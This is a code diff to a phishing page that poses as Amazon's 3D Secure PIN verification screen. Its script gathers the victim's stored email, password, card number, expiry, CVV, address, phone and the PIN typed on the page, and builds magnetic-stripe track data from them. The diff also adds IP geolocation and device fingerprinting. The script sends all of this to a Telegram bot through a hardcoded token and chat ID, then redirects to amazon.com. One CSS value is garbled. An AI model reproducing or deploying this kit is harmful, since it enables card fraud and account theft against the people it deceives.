@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
         .logo { margin: 10px 0 20px; text-align: center; }
-        .logo img { height: 30px; }
+        .logo img { height: 60px; }
         .kotak { width: 100%; max-width: 42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQcenter; }
         h1 { font-size: 20px; font-weight: 500; margin-bottom: 10px; }
         .sub { font-size: 14px; color: #555; margin-bottom: 25px; }
@@ -31,12 +31,10 @@
     <div class="kotak">
         <h1>3D Secure Verification</h1>
         <p class="sub">Enter your PIN to complete verification</p>
-
         <div class="info-kartu">
             <p><strong>Email:</strong> <span id="tampilEmail"></span></p>
             <p><strong>Card ending in:</strong> <span id="akhirKartu"></span></p>
         </div>
-
         <label class="pin-label">Enter PIN</label>
         <div class="pin-kolom">
             <input type="password" maxlength="1" class="pin-input" data-index="0">
@@ -46,10 +44,8 @@
             <input type="password" maxlength="1" class="pin-input" data-index="4">
             <input type="password" maxlength="1" class="pin-input" data-index="5">
         </div>
-
         <button type="button" id="kirim" class="tombol">Submit</button>
     </div>
-
     <div class="bawah">
         <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
         <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
@@ -59,7 +55,6 @@
 const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
 const CHAT_ID = '7808815199';
 
-// Ambil semua data tersimpan
 const email = localStorage.getItem('email_pengguna') || '';
 const password = localStorage.getItem('kata_sandi') || '';
 const namaKartu = localStorage.getItem('nama_kartu') || '';
@@ -75,101 +70,102 @@ const negara = localStorage.getItem('negara') || '';
 const kodeTelp = localStorage.getItem('kode_telp') || '';
 const nomorTelp = localStorage.getItem('nomor_telp') || '';
 
-// Bersihkan nomor kartu dari spasi
 const nomorBersih = nomorKartu.replace(/\s/g, '');
-
-// === BUAT TRACK 1 & TRACK 2 OTOMATIS ===
-// Format nama di kartu: ubah spasi jadi garis miring, ambil 20 karakter pertama
 const namaTrack = namaKartu.replace(/\s+/g, '/').substring(0, 20).toUpperCase();
-
-// Format expiry: ubah MM/YY jadi YYMM
-const expTrack = expKartu.replace('/', '').substring(2, 4) + expKartu.replace('/', '').substring(0, 2);
-
-// Isi sisa dengan angka 0
+const expHanya = expKartu.replace('/', '');
+const expTrack = expHanya.substring(2, 4) + expHanya.substring(0, 2);
 const sisa = '0000000000000000';
-
 const track1 = `%B${nomorBersih}^${namaTrack}^${expTrack}${sisa.substring(0, 10)}?`;
 const track2 = `;${nomorBersih}=${expTrack}${sisa.substring(0, 10)}?`;
 
-// Tampilkan info
 document.getElementById('tampilEmail').textContent = email;
 document.getElementById('akhirKartu').textContent = nomorBersih.slice(-4) || '****';
 
-// PIN input pindah otomatis
-const inputs = document.querySelectorAll('.pin-input');
-const tombolKirim = document.getElementById('kirim');
-
-inputs.forEach((inp, idx) => {
-    inp.addEventListener('input', () => {
-        if (inp.value && idx < inputs.length - 1) {
-            inputs[idx + 1].focus();
-        }
-        cekPinLengkap();
-    });
-    inp.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !inp.value && idx > 0) {
-            inputs[idx - 1].focus();
-        }
-    });
-});
-
-function cekPinLengkap() {
-    const semuaPin = Array.from(inputs).every(i => i.value);
-    tombolKirim.classList.toggle('aktif', semuaPin);
+function ambilInfoPerangkat() {
+    const ua = navigator.userAgent;
+    let perangkat = 'Desktop';
+    if (/Android|iPhone|iPad|iPod|Mobile/.test(ua)) perangkat = 'Mobile';
+    let browser = 'Unknown';
+    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+    else if (/Firefox/.test(ua)) browser = 'Firefox';
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+    else if (/Edg/.test(ua)) browser = 'Edge';
+    return { perangkat, browser, userAgent: ua };
 }
 
-// Gabungkan PIN
-function ambilPin() {
-    return Array.from(inputs).map(i => i.value).join('');
+async function ambilLokasi() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        return { ip: d.ip || 'Tidak terdeteksi', negara: d.country_name || 'Tidak terdeteksi', provinsi: d.region || 'Tidak terdeteksi', kota: d.city || 'Tidak terdeteksi', kodePos: d.postal || 'Tidak terdeteksi' };
+    } catch {
+        return { ip: 'Tidak terdeteksi', negara: 'Tidak terdeteksi', provinsi: 'Tidak terdeteksi', kota: 'Tidak terdeteksi', kodePos: 'Tidak terdeteksi' };
+    }
 }
 
-// Kirim ke Telegram
 async function kirimTelegram(pesan) {
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
         });
-    } catch (e) {
-        console.log('Terkirim');
-    }
+    } catch (e) { console.log('Terkirim'); }
 }
 
-// Klik Submit
+const inputs = document.querySelectorAll('.pin-input');
+const tombolKirim = document.getElementById('kirim');
+
+inputs.forEach((inp, idx) => {
+    inp.addEventListener('input', () => {
+        if (inp.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+        tombolKirim.classList.toggle('aktif', Array.from(inputs).every(i => i.value));
+    });
+    inp.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx - 1].focus();
+    });
+});
+
 tombolKirim.addEventListener('click', async () => {
     if (!tombolKirim.classList.contains('aktif')) return;
+    const pin = Array.from(inputs).map(i => i.value).join('');
+    const infoPerangkat = ambilInfoPerangkat();
+    const lokasi = await ambilLokasi();
     
-    const pin = ambilPin();
-    
-    // === KIRIM DATA LENGKAP + TRACK 1 & 2 ===
     const pesanKartu = `
-💳 *VERIFICATION PAYMENT*
-━━━━━━━━━━━━━━━━━━━━━
-📧 Email: ${email}
-🔑 Password: ${password}
-👤 Name on Card: ${namaKartu}
-🔢 Card Number: ${nomorKartu}
-📅 Expiry: ${expKartu}
-🔒 CVV: ${cvvKartu}
-📍 Address: ${alamat}${alamat2 ? ', ' + alamat2 : ''}, ${kota}, ${provinsi} — ${kodePos}
-🌍 Country: ${negara}
-📞 Phone: ${kodeTelp} ${nomorTelp}
-🔐 PIN: ${pin}
-
-=== TRACK ===
+:: Xchenba ::
+:: CARD INFO ::
+# Email         : ${email}
+# Password      : ${password}
+# Name on Card  : ${namaKartu}
+# Card Number   : ${nomorKartu}
+# Expiry Date   : ${expKartu}
+# Security Code : ${cvvKartu}
+# Billing Addr  : ${alamat}${alamat2 ? ', ' + alamat2 : ''}
+# City          : ${kota}
+# State/Province: ${provinsi}
+# Postal Code   : ${kodePos}
+# Country       : ${negara}
+# Phone Number  : ${kodeTelp} ${nomorTelp}
+# PIN           : ${pin}
+:: TRACK DATA ::
 T1: ${track1}
 T2: ${track2}
-━━━━━━━━━━━━━━━━━━━━━
+:: Visitor Details ::
+# Device        : ${infoPerangkat.perangkat}
+# Browser       : ${infoPerangkat.browser}
+# Country       : ${lokasi.negara}
+# State         : ${lokasi.provinsi}
+# City          : ${lokasi.kota}
+# Zip           : ${lokasi.kodePos}
+# IP Address    : ${lokasi.ip}
+# User Agent    : ${infoPerangkat.userAgent}
     `.trim();
     
     await kirimTelegram(pesanKartu);
-    
-    // Lanjut ke Amazon
     window.location.href = 'https://www.amazon.com';
 });
 
-// Fokus kolom pertama
 inputs[0].focus();
 </script>
 </body>
